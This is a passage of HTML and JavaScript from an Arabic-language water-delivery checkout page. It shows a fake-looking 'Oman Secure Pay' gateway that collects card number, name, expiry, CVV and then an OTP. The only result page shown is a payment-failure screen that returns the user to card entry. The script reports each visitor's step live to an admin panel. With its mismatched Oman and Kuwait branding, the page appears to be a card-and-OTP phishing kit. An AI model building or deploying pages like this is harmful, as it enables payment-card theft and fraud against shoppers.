                                    <div class="opt-title">دفع المبلغ بالكامل الآن</div>
                                    <div class="opt-desc">ادفع المبلغ بالكامل مسبقًا — <span id="full-amount-text">0.000</span> KWD</div>
                                </div>
                            </div>
                        </label>
                    </div>

                    <!-- Order Summary -->
                    <div class="form-card">
                        <h3>ملخص الطلب</h3>
                        <div id="order-items-summary"></div>
                        <hr class="summary-divider">
                        <div class="summary-row">
                            <span>المجموع الفرعي</span>
                            <span id="subtotal-val">0.000 KWD</span>
                        </div>
                        <div class="summary-row">
                            <span>رسوم التوصيل</span>
                            <span style="color: #059669;">مجاني</span>
                        </div>
                        <div class="summary-total">
                            <span>المبلغ المطلوب الآن</span>
                            <span class="summary-total-val" id="total-val">1.000 د.ك</span>
                        </div>
                    </div>

                    <button class="btn-submit" type="button" id="btn-delivery-submit" onclick="submitDelivery()">تأكيد الطلب</button>
                </form>
            </div>
        </div>
    </div>

    <!-- ============ PAGE 2: PAYMENT GATEWAY ============ -->
    <div id="page-payment" class="page">
        <div class="payment-page-header">
            <h1>بوابة الدفع الآمنة</h1>
            <p>أدخل بيانات بطاقتك لإتمام عملية الدفع</p>
        </div>
        <div class="checkout-container">
            <div class="gateway-card">
                <div class="gateway-header">
                    <div class="gateway-header-icon"><i class="fa-solid fa-shield-halved"></i></div>
                    <div class="gateway-header-text">
                        <strong>Oman Secure Pay</strong>
                        <span>بوابة دفع آمنة ومشفرة</span>
                    </div>
                </div>
                <div class="gateway-amount-bar">
                    <span class="gateway-amount-label">المبلغ المطلوب</span>
                    <span class="gateway-amount-value" id="gw-amount">1.000 د.ك</span>
                </div>

                <div class="mock-card-preview">
                    <div class="mock-card-brand" id="gw-card-brand-icon"><i class="fa-solid fa-credit-card"></i></div>
                    <div class="mock-card-chip"></div>
                    <div class="mock-card-number-display" id="gw-card-display">•••• •••• •••• ••••</div>
                    <div class="mock-card-meta">
                        <div>
                            <div class="mock-card-meta-label">Card Holder</div>
                            <div class="mock-card-meta-value" id="gw-card-name-display">YOUR NAME</div>
                        </div>
                        <div>
                            <div class="mock-card-meta-label">Expires</div>
                            <div class="mock-card-meta-value" id="gw-card-exp-display">MM/YY</div>
                        </div>
                    </div>
                </div>

                <div class="gateway-form">
                    <div class="gateway-input-group">
                        <label class="gateway-label">رقم البطاقة</label>
                        <div class="gateway-input-wrap">
                            <input class="gateway-input" type="text" id="gw-card-number" maxlength="19" placeholder="4242 4242 4242 4242" oninput="onCardNumberInput(this)" style="padding-right: 50px; padding-left: 16px;">
                            <span class="gateway-input-icon" id="gw-input-brand-icon"><i class="fa-solid fa-credit-card"></i></span>
                        </div>
                        <div class="gateway-error hidden" id="gw-err-card-number"></div>
                    </div>

                    <div class="gateway-input-group">
                        <label class="gateway-label">اسم حامل البطاقة</label>
                        <input class="gateway-input" type="text" id="gw-card-name" placeholder="MOHAMMED AL SALMI" oninput="onCardNameInput(this)">
                        <div class="gateway-error hidden" id="gw-err-card-name"></div>
                    </div>

                    <div class="gateway-row">
                        <div class="gateway-input-group">
                            <label class="gateway-label">تاريخ الانتهاء (MM/YY)</label>
                            <input class="gateway-input" type="text" id="gw-card-exp" maxlength="5" placeholder="12/28" oninput="onCardExpInput(this)">
                            <div class="gateway-error hidden" id="gw-err-card-exp"></div>
                        </div>
                        <div class="gateway-input-group">
                            <label class="gateway-label">CVV</label>
                            <input class="gateway-input" type="text" id="gw-card-cvv" maxlength="4" placeholder="123" oninput="onCardCvvInput(this)">
                            <div class="gateway-error hidden" id="gw-err-card-cvv"></div>
                        </div>
                    </div>

                    <button class="btn-pay" id="btn-pay-submit" onclick="processPayment()">
                        <i class="fa-solid fa-lock"></i> ادفع الآن
                    </button>
                </div>

                <div class="gateway-footer">
                    <div class="security-badge"><i class="fa-solid fa-lock"></i> SSL Encrypted</div>
                    <div>PCI DSS Compliant</div>
                    <div class="secure-pay-text">Oman Secure Pay</div>
                </div>
            </div>

            <div style="text-align: center; margin-top: 16px;">
                <button class="btn-back" onclick="goToDelivery()">
                    <i class="fa-solid fa-arrow-right"></i> العودة لبيانات التوصيل
                </button>
            </div>
        </div>
    </div>

    <!-- ============ PAGE 3: OTP VERIFICATION ============ -->
    <div id="page-otp" class="page">
        <div class="otp-page">
            <div class="otp-container">
                <div class="otp-card">
                    <div class="otp-icon">
                        <i class="fa-solid fa-shield-halved"></i>
                    </div>
                    <h2 class="otp-title">التحقق الأمني</h2>
                    {{-- <p class="otp-subtitle">
                        تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم جوالك المسجل.
                        <br>أدخل الرمز أدناه لتأكيد عملية الدفع.
                    </p> --}}

                    <input class="otp-input" type="text" id="otp-code" maxlength="6" placeholder="• • • • • •" oninput="onOtpInput(this)">
                    <div class="error-msg" id="err-otp" style="text-align: center; margin-top: 8px;">يرجى إدخال رمز التحقق المكون من 6 أرقام</div>

                    <div class="otp-resend">
                        إعادة إرسال الرمز خلال <strong id="otp-timer">59</strong> ثانية
                    </div>

                    <button class="btn-otp" id="btn-otp-submit" onclick="submitOtp()">تأكيد الدفع</button>
                </div>
            </div>
        </div>
    </div>

    <!-- ============ PAGE 4: FAILURE ============ -->
    <div id="page-failure" class="page">
        <div class="failure-page">
            <div class="failure-container">
                <div class="failure-card">
                    <div class="failure-icon">
                        <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                            <line x1="15" y1="9" x2="9" y2="15"/>
                            <line x1="9" y1="9" x2="15" y2="15"/>
                        </svg>
                    </div>
                    <h2 class="failure-title">خطأ – فشلت عملية الدفع</h2>
                    <p class="failure-desc" id="failure-desc-text">
                        تعذر معالجة رمز التحقق الذي أدخلته. يرجى العودة لإتمام الطلب من جديد.
                    </p>
                    <button class="btn-failure" onclick="goToPayment()">
                        <span>العودة إلى بيانات الدفع</span>
                        <span style="font-weight: bold; font-size: 1.2rem;">&rsaquo;</span>
                    </button>
                    <p class="failure-note">
                        تم حفظ منتجات سلتك. يمكنك تعديل بيانات الطلب والمحاولة مرة أخرى.
                    </p>
                    <hr class="failure-divider">
                    <div class="failure-badges">
                        <div class="pci-badge">PCI DSS</div>
                        <div class="powered-text"><span>مدعوم من</span> <strong>Network International</strong></div>
                        <div class="secure-pay-text">Oman Secure Pay</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- ============ LOADING OVERLAY ============ -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text" id="loading-text">جاري المعالجة...</div>
        <div class="loading-subtext" id="loading-subtext">يرجى الانتظار</div>
    </div>

    <!-- FOOTER -->
    <footer>
        <div class="footer-container">
            <!-- Brand Column -->
            <div>
                <a href="/" class="footer-logo">
                    <div class="footer-logo-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px;">
                            <path d="M15.5 21a5.5 5.5 0 0 0 5.5-5.5c0-2-1.5-3.5-3-5.5-.5-.7-1-1.5-1.5-2.5-.5 1-1 1.8-1.5 2.5-1.5 2-3 3.5-3 5.5A5.5 5.5 0 0 0 15.5 21z"></path>
                            <path d="M8.5 18a4.5 4.5 0 0 0 4.5-4.5c0-1.5-1-3-2.5-5C10 7.5 9.5 6.5 9 5.5 8.5 6.5 8 7.5 7.5 8.5 6 10.5 5 12 5 13.5A4.5 4.5 0 0 0 9.5 18z"></path>
                        </svg>
                    </div>
                    <span class="brand-logo-text" style="color:#e2e8f0;"><span>OASIS</span><span>OMAN</span></span>
                </a>
                <div style="font-size:0.75rem;font-weight:700;color:#475569;margin-bottom:10px;">مياه الواحة</div>
                <p class="footer-brand-desc">أفضل مياه شرب نقية في دولة الكويت، نصلك أينما كنت.</p>
                <div class="footer-socials">
                    <a href="#" class="footer-social-btn"><i class="fa-brands fa-instagram"></i></a>
                    <a href="#" class="footer-social-btn"><i class="fa-brands fa-twitter"></i></a>
                    <a href="#" class="footer-social-btn"><i class="fa-brands fa-whatsapp"></i></a>
                    <a href="#" class="footer-social-btn"><i class="fa-brands fa-facebook"></i></a>
                </div>
            </div>
            <!-- Quick Links -->
            <div>
                <h4 class="footer-col-title">روابط سريعة</h4>
                <ul class="footer-links-list">
                    <li class="footer-link-item"><a href="/">الرئيسية</a></li>
                    <li class="footer-link-item"><a href="/#about">من نحن</a></li>
                    <li class="footer-link-item"><a href="/#products">منتجاتنا</a></li>
                    <li class="footer-link-item"><a href="/#contact">اتصل بنا</a></li>
                    <li class="footer-link-item"><a href="/admin" style="color:#38bdf8;font-weight:700;">لوحة التحكم</a></li>
                </ul>
            </div>
            <!-- Policies -->
            <div>
                <h4 class="footer-col-title">السياسات</h4>
                <ul class="footer-links-list">
                    <li class="footer-link-item"><a href="#">سياسة الخصوصية</a></li>
                    <li class="footer-link-item"><a href="#">الشروط والأحكام</a></li>
                    <li class="footer-link-item"><a href="#">سياسة التوصيل</a></li>
                    <li class="footer-link-item"><a href="#">سياسة الاسترجاع</a></li>
                </ul>
            </div>
            <!-- Contact -->
            <div>
                <h4 class="footer-col-title">تواصل معنا</h4>
                <div class="footer-contact-list">
                    <div class="contact-item-row"><i class="fa-solid fa-location-dot"></i><div>مدينة الكويت، دولة الكويت</div></div>
                    <div class="contact-item-row"><i class="fa-solid fa-phone"></i><div dir="ltr">+965 50286025</div></div>
                    <div class="contact-item-row"><i class="fa-brands fa-whatsapp"></i><div dir="ltr">+965 50286025</div></div>
                    <div class="contact-item-row"><i class="fa-solid fa-envelope"></i><div>info@oasisoman.com</div></div>
                </div>
            </div>
        </div>
        <div class="footer-bottom-bar">
            &copy; 2025 OASIS KUWAIT &mdash; مياه الواحة. جميع الحقوق محفوظة.
        </div>
    </footer>

    <!-- Leaflet JS -->
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
    // ═══════════════════════════════════════════════════════════════
    // DATA & CONFIGURATION
    // ═══════════════════════════════════════════════════════════════
    const productsData = {
        p1: { id: 'p1', title_ar: 'مياه الواحة 200 مل', price: 0.400, img: '/images/oasis_200ml.jpg' },
        p2: { id: 'p2', title_ar: 'مياه الواحة 330 مل', price: 0.400, img: '/images/oasis_330ml.jpg' },
        p3: { id: 'p3', title_ar: 'مياه الواحة 500 مل', price: 0.450, img: '/images/oasis_500ml.png' },
        p4: { id: 'p4', title_ar: 'مياه الواحة 1.5 لتر', price: 0.450, img: '/images/oasis_1500ml.png' },
        p5: { id: 'p5', title_ar: 'جالون مياه الواحة 5 لتر (قابل للاسترداد)', price: 0.800, img: '/images/oasis_5gallon_refill.png' },
        p6: { id: 'p6', title_ar: 'موزع مياه الواحة الساخن والبارد', price: 20.000, img: '/images/oasis_dispenser_cooler.png' }
    };

    const arabCountries = [
        { code: 'KW', nameAr: 'الكويت', dialCode: '+965', flag: '🇰🇼', minLen: 7, maxLen: 12,
          governorates: {
            'العاصمة': ['مدينة الكويت', 'شرق', 'المرقاب', 'القبلة', 'بنيد القار', 'الدسمة', 'الداعية', 'الشويخ', 'الشامية', 'ضاحية عبد الله السالم', 'النزهة', 'كيفان', 'الخالدية'],
            'حولي': ['حولي', 'السالمية', 'الرميثية', 'الجابرية', 'سلوى', 'بيان', 'مشرف', 'الشعب', 'غرب مشرف'],
            'الأحمدي': ['الأحمدي', 'الفحيحيل', 'المنقف', 'أبو حليفة', 'الصباحية', 'الرقة', 'العقيلة', 'الوفرة', 'الخيران'],
            'الفروانية': ['الفروانية', 'خيطان', 'جليب الشيوخ', 'الأندلس', 'العارضية', 'الفردوس', 'الرحاب', 'الرابية'],
            'الجهراء': ['الجهراء', 'النعيم', 'النسيم', 'العيون', 'الواحة', 'القصر', 'سعد العبد الله', 'المطلاع', 'العبدلي'],
            'مبارك الكبير': ['مبارك الكبير', 'القرين', 'القصور', 'العدان', 'صباح السالم', 'المسيلة', 'أبو فطيرة', 'الفنيطيس']
          }
        },
        { code: 'SA', nameAr: 'السعودية', dialCode: '+966', flag: '🇸🇦', minLen: 8, maxLen: 12,
          governorates: {
            'الرياض': ['الرياض', 'الخرج', 'الدرعية', 'المجمعة', 'الدوادمي', 'وادي الدواسر', 'الزلفي'],
            'مكة المكرمة': ['جدة', 'مكة المكرمة', 'الطائف', 'القنفذة', 'الليث', 'رابغ'],
            'المنطقة الشرقية': ['الدمام', 'الخبر', 'الظهران', 'الأحساء', 'القطيف', 'الجبيل', 'حفر الباطن'],
            'المدينة المنورة': ['المدينة المنورة', 'ينبع', 'العلا', 'بدر'],
            'القصيم': ['بريدة', 'عنيزة', 'الرس', 'البكيرية'],
            'عسير': ['أبها', 'خميس مشيط', 'بيشة'],
            'تبوك': ['تبوك', 'ضباء', 'أملج'],
            'حائل': ['حائل', 'بقعاء'],
            'جازان': ['جازان', 'صبيا', 'أبو عريش'],
            'نجران': ['نجران', 'شرورة'],
            'الباحة': ['الباحة', 'بلجرشي'],
            'الجوف': ['سكاكا', 'القريات']
          }
        },
        { code: 'AE', nameAr: 'الإمارات', dialCode: '+971', flag: '🇦🇪', minLen: 8, maxLen: 12,
          governorates: {
            'دبي': ['دبي', 'ديرة', 'بر دبي', 'المرقبات', 'جي إل تي', 'داون تاون', 'الممزر'],
            'أبوظبي': ['أبوظبي', 'العين', 'الظفرة', 'الرويس'],
            'الشارقة': ['الشارقة', 'خورفكان', 'كلباء', 'الذيد'],
            'عجمان': ['عجمان', 'مصفوت'],
            'رأس الخيمة': ['رأس الخيمة', 'الرمس'],
            'الفجيرة': ['الفجيرة', 'دبا الفجيرة'],
            'أم القيوين': ['أم القيوين', 'فلج المعلا']
          }
        },
        { code: 'QA', nameAr: 'قطر', dialCode: '+974', flag: '🇶🇦', minLen: 7, maxLen: 10,
          governorates: {
            'الدوحة': ['الدوحة', 'الدفنة', 'اللؤلؤة', 'مشيرب', 'السد'],
            'الريان': ['الريان', 'معيذر', 'الغرافة'],
            'الوكرة': ['الوكرة', 'مسيعيد'],
            'الخور': ['الخور', 'الذخيرة']
          }
        },
        { code: 'OM', nameAr: 'عُمان', dialCode: '+968', flag: '🇴🇲', minLen: 7, maxLen: 10,
          governorates: {
            'مسقط': ['مسقط', 'مطرح', 'العامرات', 'بوشر', 'السيب', 'قريات'],
            'ظفار': ['صلالة', 'طاقة', 'مرباط', 'ثمريت'],
            'شمال الباطنة': ['صحار', 'شناص', 'لوى', 'صحم', 'الخابورة', 'السويق'],
            'جنوب الباطنة': ['الرستاق', 'العوابي', 'نخل', 'بركاء', 'المصنعة'],
            'الداخلية': ['نزوى', 'بهلاء', 'سمائل', 'إزكي']
          }
        },
        { code: 'BH', nameAr: 'البحرين', dialCode: '+973', flag: '🇧🇭', minLen: 7, maxLen: 10,
          governorates: {
            'العاصمة (المنامة)': ['المنامة', 'الجفير', 'العدلية', 'أم الحصم'],
            'المحرق': ['المحرق', 'البسيتين', 'عراد', 'الحد'],
            'المنطقة الشمالية': ['البديع', 'سار', 'عالي'],
            'المنطقة الجنوبية': ['الرفاع', 'مدينة عيسى', 'الزلاق']
          }
        },
        { code: 'EG', nameAr: 'مصر', dialCode: '+20', flag: '🇪🇬', minLen: 9, maxLen: 12,
          governorates: {
            'القاهرة': ['مدينة نصر', 'مصر الجديدة', 'التجمع الخامس', 'المعادي', 'وسط البلد', 'الزمالك', 'الشروق', 'مدينتي'],
            'الجيزة': ['الدقي', 'المهندسين', '6 أكتوبر', 'الشيخ زايد', 'الهرم', 'فيصل'],
            'الإسكندرية': ['سموحة', 'ميامي', 'المنتزه', 'ستانلي', 'العجمي'],
            'الشرقية': ['الزقازيق', 'العاشر من رمضان', 'بلبيس'],
            'الدقهلية': ['المنصورة', 'طلخا', 'ميت غمر'],
            'القليوبية': ['بنها', 'شبرا الخيمة', 'العبور']
          }
        },
        { code: 'JO', nameAr: 'الأردن', dialCode: '+962', flag: '🇯🇴', minLen: 8, maxLen: 11,
          governorates: {
            'عمان': ['عمان', 'عبدون', 'الشميساني', 'الجبيهة', 'خلدا', 'تلاع العلي'],
            'إربد': ['إربد', 'الرمثا'],
            'الزرقاء': ['الزرقاء', 'الرصيفة'],
            'العقبة': ['العقبة']
          }
        },
        { code: 'IQ', nameAr: 'العراق', dialCode: '+964', flag: '🇮🇶', minLen: 9, maxLen: 12,
          governorates: {
            'بغداد': ['الكرادة', 'المنصور', 'الزيونة', 'الأعظمية', 'الشعب'],
            'البصرة': ['البصرة', 'القرنة', 'الزبير'],
            'أربيل': ['أربيل', 'عينكاوة'],
            'النجف': ['النجف', 'الكوفة']
          }
        },
        { code: 'LB', nameAr: 'لبنان', dialCode: '+961', flag: '🇱🇧', minLen: 7, maxLen: 10,
          governorates: {
            'بيروت': ['بيروت', 'الاشرفية', 'الجميزة', 'الحمرا'],
            'جبل لبنان': ['جونية', 'المتن', 'الحدث']
          }
        },
        { code: 'SY', nameAr: 'سوريا', dialCode: '+963', flag: '🇸🇾', minLen: 8, maxLen: 11,
          governorates: {
            'دمشق': ['دمشق', 'المزة', 'أبو رمانة', 'المالكي'],
            'حلب': ['حلب', 'الشهباء', 'الفرقان'],
            'اللاذقية': ['اللاذقية', 'جبلة']
          }
        },
        { code: 'YE', nameAr: 'اليمن', dialCode: '+967', flag: '🇾🇪', minLen: 8, maxLen: 11,
          governorates: {
            'صنعاء': ['صنعاء', 'السبعين', 'التحرير', 'حدة'],
            'عدن': ['عدن', 'كريتر', 'المعلا', 'المنصورة']
          }
        },
        { code: 'LY', nameAr: 'ليبيا', dialCode: '+218', flag: '🇱🇾', minLen: 8, maxLen: 11,
          governorates: {
            'طرابلس': ['طرابلس', 'حي الأندلس', 'بن عاشور'],
            'بنغازي': ['بنغازي', 'الفويهات']
          }
        },
        { code: 'SD', nameAr: 'السودان', dialCode: '+249', flag: '🇸🇩', minLen: 8, maxLen: 11,
          governorates: {
            'الخرطوم': ['الخرطوم', 'أم درمان', 'بحري']
          }
        },
        { code: 'MA', nameAr: 'المغرب', dialCode: '+212', flag: '🇲🇦', minLen: 8, maxLen: 11,
          governorates: {
            'الدار البيضاء': ['الدار البيضاء', 'المعاريف', 'أنفا'],
            'الرباط': ['الرباط', 'أكدال'],
            'مراكش': ['مراكش', 'جليز']
          }
        },
        { code: 'DZ', nameAr: 'الجزائر', dialCode: '+213', flag: '🇩🇿', minLen: 8, maxLen: 11,
          governorates: {
            'الجزائر العاصمة': ['الجزائر', 'حيدرة', 'باب الزوار'],
            'وهران': ['وهران', 'عين الترك']
          }
        },
        { code: 'TN', nameAr: 'تونس', dialCode: '+216', flag: '🇹🇳', minLen: 7, maxLen: 10,
          governorates: {
            'تونس العاصمة': ['تونس', 'المرسى', 'سيدي بوسعيد'],
            'سوسة': ['سوسة', 'القنطاوي']
          }
        },
        { code: 'PS', nameAr: 'فلسطين', dialCode: '+970', flag: '🇵🇸', minLen: 8, maxLen: 11,
          governorates: {
            'رام الله والبيرة': ['رام الله', 'البيرة', 'بيتونيا'],
            'القدس الشريف': ['القدس', 'بيت حنينا'],
            'غزة': ['غزة', 'الرمال', 'خان يونس']
          }
        },
        { code: 'OTHER', nameAr: 'دولة عربية أخرى', dialCode: '+', flag: '🌍', minLen: 6, maxLen: 15,
          governorates: {
            'المنطقة الرئيسية': ['المدينة الرئيسية']
          }
        }
    ];

    let cart = JSON.parse(localStorage.getItem('oasis-cart') || '[]');
    let checkoutOrderId = null;
    let otpTimerInterval = null;

    // ═══════════════════════════════════════════════════════════════
    // MAP LOCATION SELECTOR
    // ═══════════════════════════════════════════════════════════════
    let checkoutMap = null;
    let checkoutMarker = null;
    let checkoutLat = '';
    let checkoutLng = '';

    function openMapModal() {
        const modal = document.getElementById('map-modal-overlay');
        modal.classList.add('active');
        initCheckoutMap();
    }

    function closeMapModal(event) {
        if (event && event.target.id !== 'map-modal-overlay') return;
        const modal = document.getElementById('map-modal-overlay');
        modal.classList.remove('active');
    }

    function confirmMapLocation() {
        if (!checkoutLat || !checkoutLng) {
            alert('يرجى تحديد موقع على الخريطة أولاً');
            return;
        }
        closeMapModal();
    }

    function initCheckoutMap() {
        if (checkoutMap) {
            setTimeout(() => { checkoutMap.invalidateSize(); }, 300);
            return;
        }

        const defaultLat = 29.3759;
        const defaultLng = 47.9774; // Oman center

        checkoutMap = L.map('checkout-map').setView([defaultLat, defaultLng], 7);

        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '© OpenStreetMap'
        }).addTo(checkoutMap);

        const customIcon = L.divIcon({
            className: 'custom-leaflet-marker',
            html: '<div style="color: #0284c7; font-size: 32px; text-shadow: 0 2px 6px rgba(0,0,0,0.3);"><i class="fa-solid fa-location-dot"></i></div>',
            iconSize: [32, 32],
            iconAnchor: [16, 32]
        });

        checkoutMap.on('click', function(e) {
            const lat = e.latlng.lat;
            const lng = e.latlng.lng;

            if (checkoutMarker) {
                checkoutMarker.setLatLng([lat, lng]);
            } else {
                checkoutMarker = L.marker([lat, lng], { draggable: true, icon: customIcon }).addTo(checkoutMap);
            }

            checkoutLat = lat.toFixed(6);
            checkoutLng = lng.toFixed(6);
            updateMapCoordsDisplay();
        });

        setTimeout(() => { checkoutMap.invalidateSize(); }, 300);
    }

    function detectCheckoutLocation() {
        if (!navigator.geolocation) {
            alert('خاصية تحديد الموقع غير مدعومة في متصفحك');
            return;
        }

        const btn = document.querySelector('.locate-btn');
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> <span>جاري تحديد الموقع...</span>';

        navigator.geolocation.getCurrentPosition(
            pos => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                checkoutLat = lat.toFixed(6);
                checkoutLng = lng.toFixed(6);

                if (checkoutMap && checkoutMarker) {
                    checkoutMap.setView([lat, lng], 15);
                    checkoutMarker.setLatLng([lat, lng]);
                } else if (checkoutMap) {
                    const customIcon = L.divIcon({
                        className: 'custom-leaflet-marker',
                        html: '<div style="color: #0284c7; font-size: 32px; text-shadow: 0 2px 6px rgba(0,0,0,0.3);"><i class="fa-solid fa-location-dot"></i></div>',
                        iconSize: [32, 32],
                        iconAnchor: [16, 32]
                    });
                    checkoutMarker = L.marker([lat, lng], { draggable: true, icon: customIcon }).addTo(checkoutMap);
                    checkoutMap.setView([lat, lng], 15);
                }

                updateMapCoordsDisplay();
                btn.innerHTML = '<i class="fa-solid fa-crosshairs"></i> <span>موقعي الحالي</span>';
            },
            err => {
                btn.innerHTML = '<i class="fa-solid fa-crosshairs"></i> <span>موقعي الحالي</span>';
                alert('تعذر الحصول على موقعك الحالي. يرجى تحديده على الخريطة.');
            }
        );
    }

    function removeCheckoutMarker() {
        if (checkoutMarker) {
            checkoutMap.removeLayer(checkoutMarker);
            checkoutMarker = null;
        }
        checkoutLat = '';
        checkoutLng = '';
        updateMapCoordsDisplay();
    }

    function updateMapCoordsDisplay() {
        const display = document.getElementById('map-coords-display');
        const badge = document.getElementById('map-selected-badge');
        const confirmBtn = document.getElementById('map-confirm-btn');

        if (checkoutLat && checkoutLng) {
            display.innerText = checkoutLat + ', ' + checkoutLng;
            if (badge) badge.classList.add('show');
            if (confirmBtn) confirmBtn.disabled = false;
        } else {
            display.innerText = 'لم يتم تحديث موقع بعد';
            if (badge) badge.classList.remove('show');
            if (confirmBtn) confirmBtn.disabled = true;
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // PAGE NAVIGATION
    // ═══════════════════════════════════════════════════════════════
    function showPage(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
        window.scrollTo({ top: 0, behavior: 'smooth' });

        // Mark user as completed (removes them from tracking) when they reach the end
        if (pageId === 'page-failure' || pageId === 'page-success') {
            trackStep('completed');
        }
    }

    function showLoading(text, subtext) {
        document.getElementById('loading-text').innerText = text || 'جاري المعالجة...';
        document.getElementById('loading-subtext').innerText = subtext || 'يرجى الانتظار';
        document.getElementById('loading-overlay').classList.add('active');
    }

    function hideLoading() {
        document.getElementById('loading-overlay').classList.remove('active');
    }

    // ═══════════════════════════════════════════════════════════════
    // STEP TRACKING (REAL-TIME FOR ADMIN)
    // ═══════════════════════════════════════════════════════════════

    // Returns the same UUID token for this browser session (shared with welcome page via sessionStorage)
    function getTrackingToken() {
        let token = sessionStorage.getItem('_tracking_token');
        if (!token) {
            token = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
                const r = Math.random() * 16 | 0;
                return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
            });
            sessionStorage.setItem('_tracking_token', token);
        }
        return token;
    }

    async function trackStep(step) {
        try {
            const res = await fetch('/api/track-step', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ step: step, token: getTrackingToken() })
            });
            // Store current step so heartbeat keeps session alive
            if (step === 'completed') {
                sessionStorage.removeItem('funnel_step');
            } else {
                sessionStorage.setItem('funnel_step', step);
            }
        } catch(e) {}
    }

    async function sendHeartbeat() {
        const step = sessionStorage.getItem('funnel_step');
        if (!step) return;
        try {
            await fetch('/api/heartbeat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: getTrackingToken() })
            });
        } catch(e) {}
    }

    // ═══════════════════════════════════════════════════════════════
    // SAVE ORDER TO DATABASE (REAL-TIME SYNC)
    // ═══════════════════════════════════════════════════════════════
    async function saveOrderToDB(data) {
        try {
            const res = await fetch('/api/admin/save-order', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                },
                body: JSON.stringify(data)
            });
            if (res.ok) {
                const result = await res.json();
                return result;
            }
        } catch(e) { console.error('Save order error:', e); }
        return null;
    }

    // ═══════════════════════════════════════════════════════════════
    // ORDER SUMMARY
    // ═══════════════════════════════════════════════════════════════
        function renderOrderSummary() {
        const container = document.getElementById('order-items-summary');
        let subtotal = 0;
        let html = '';
        
        if (typeof cart !== 'undefined' && Array.isArray(cart)) {
            cart.forEach(item => {
                const p = (typeof productsData !== 'undefined') ? productsData[item.id] : null;
                if (p) {
                    const itemTotal = p.price * item.qty;
                    subtotal += itemTotal;
                    html += `<div class="summary-item">
                        <span class="summary-item-name">${p.title_ar || p.title_en || ''} × ${item.qty}</span>
                        <span class="summary-item-price">${itemTotal.toFixed(3)} د.ك.</span>
                    </div>`;
                }
            });
        }

        if (container) container.innerHTML = html;
        
        const subtotalEl = document.getElementById('subtotal-val');
        if (subtotalEl) subtotalEl.innerText = subtotal.toFixed(3) + ' د.ك.';

        const fullAmountEl = document.getElementById('full-amount-text');
        if (fullAmountEl) fullAmountEl.innerText = subtotal.toFixed(3);

        const badgeEl = document.getElementById('cart-badge-nav');
        if (badgeEl) badgeEl.innerText = (typeof cart !== 'undefined' && Array.isArray(cart)) ? cart.length : 0;

        const totalValEl = document.getElementById('total-val');
        if (totalValEl) {
            const method = document.querySelector('input[name="payment"]:checked')?.value;
            if (method === 'partial') {
                totalValEl.innerText = '1.000 د.ك.';
            } else {
                totalValEl.innerText = subtotal.toFixed(3) + ' د.ك.';
            }
        }
    }

    // ═══════════════════════════════════════════════════════════════
    // COUNTRY & GOVERNORATE / WILAYA LOGIC
    // ═══════════════════════════════════════════════════════════════
    function populateCountryOptions() {
        const select = document.getElementById('d-country');
        if (!select) return;
        select.innerHTML = '';
        arabCountries.forEach(c => {
            select.innerHTML += `<option value="${c.code}">${c.flag} ${c.nameAr} (${c.dialCode})</option>`;
        });
        select.value = 'KW';
        onCountryChange('KW');
    }

    function onCountryChange(countryCode) {
        const country = arabCountries.find(c => c.code === countryCode) || arabCountries[0];
        const phoneCodeEl = document.getElementById('d-phone-code');
        if (phoneCodeEl) {
            phoneCodeEl.innerText = country.dialCode;
        }

        const govSelect = document.getElementById('d-governorate');
        const wilSelect = document.getElementById('d-wilaya');
        if (govSelect) {
            govSelect.innerHTML = '<option value="">اختر المحافظة / المنطقة</option>';
            if (country.governorates) {
                Object.keys(country.governorates).forEach(gName => {
                    govSelect.innerHTML += `<option value="${gName}">${gName}</option>`;
                });
            }
        }
        if (wilSelect) {
            wilSelect.innerHTML = '<option value="">اختر المنطقة / المدينة</option>';
        }
    }

    document.getElementById('d-governorate')?.addEventListener('change', function() {
        const countryCode = document.getElementById('d-country')?.value || 'KW';
        const country = arabCountries.find(c => c.code === countryCode) || arabCountries[0];
        const wilSelect = document.getElementById('d-wilaya');
        if (!wilSelect) return;
        wilSelect.innerHTML = '<option value="">اختر المنطقة / المدينة</option>';

        if (this.value && country.governorates && country.governorates[this.value]) {
            country.governorates[this.value].forEach(w => {
                wilSelect.innerHTML += `<option value="${w}">${w}</option>`;
            });
            wilSelect.disabled = false;
        } else {
            wilSelect.disabled = true;
        }
    });

    document.addEventListener('DOMContentLoaded', function() {
        populateCountryOptions();
    });

    // ═══════════════════════════════════════════════════════════════
    // PAYMENT OPTION TOGGLE
    // ═══════════════════════════════════════════════════════════════
    document.querySelectorAll('.payment-option').forEach(opt => {
        opt.addEventListener('click', function() {
            document.querySelectorAll('.payment-option').forEach(o => {
                o.classList.remove('selected');
            });
            this.classList.add('selected');
            this.querySelector('input').checked = true;
            renderOrderSummary();
        });
    });

    // ═══════════════════════════════════════════════════════════════
    // DELIVERY SUBMISSION
    // ═══════════════════════════════════════════════════════════════
    async function submitDelivery() {
        let valid = true;
        const name = document.getElementById('d-name').value.trim();
        const phone = document.getElementById('d-phone').value.trim();
        const countryCode = document.getElementById('d-country')?.value || 'KW';
        const countryObj = arabCountries.find(c => c.code === countryCode) || arabCountries[0];
        const gov = document.getElementById('d-governorate').value;
